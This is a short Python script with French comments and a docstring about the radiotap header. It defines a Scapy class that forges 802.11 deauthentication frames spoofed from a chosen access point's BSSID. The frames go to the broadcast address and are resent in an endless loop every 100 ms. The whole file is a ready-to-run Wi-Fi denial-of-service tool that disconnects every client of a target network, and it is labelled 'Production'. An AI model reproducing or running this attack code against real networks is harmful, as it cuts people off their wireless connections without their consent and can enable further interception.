from scapy.layers.dot11 import RadioTap
"""
L'interface radiotap est une surcouche logicielle à une interface réseau physique,
créant une nouvelle interface virtuelle (nommée « rtapX », où X est un entier naturel). Elle
permet d'ajouter à tout paquet capturé un en-tête contenant des informations sur la trame
reçue, informations sur la communication radio elle-même comme la puissance du signal,
ou encore la fréquence utilisée. Cet en-tête est de longueur variable, le nombre de champs 
le composant n'étant pas fixé, les champs présents dans l'en-tête sont connus grâce aux
bits du champ present flags. À l'heure actuelle, tout n'est pas encore implémenté dans cet
en-tête, certains champs ne peuvent donc pas être utilisés, par exemple celui permettant de
connaître le type de cryptage (WEP, WPA) contenu normalement dans le champs flags.
"""

from scapy.layers.dot11 import Dot11
from scapy.layers.dot11 import Dot11Deauth
from scapy.all import sendp
__author__ = "Chauvin Antoine"
__copyright__ = ""
__credits__ = ["Chauvin Antoine"]
__license__ = ""
__version__ = "1.0"
__maintainer__ = "Chauvin Antoine"
__email__ = "antoine.chauvin@live.fr"
__status__ = "Production"


class ScapyDeauth:
    """On définis une classe ScapyDeauth qui se chargera
    d'envoyer une trame 802.11 de Désauthentification'"""
    def __init__(self, iface, bssid):
        self.iface = iface
        self.bssid = bssid
        self.destination = "ff:ff:ff:ff:ff:ff"

    def start(self):
        """"
        Méthode de classe principale qui se contente de lancer la désauthentification
        """
        frame = RadioTap()/Dot11(addr1=self.destination, addr2=self.bssid, addr3=self.bssid)/Dot11Deauth()
        sendp(frame, iface=self.iface, loop=1, inter=0.100)

if __name__ == "__main__":
    my_deauth = ScapyDeauth(iface="", bssid="")
    my_deauth.start()
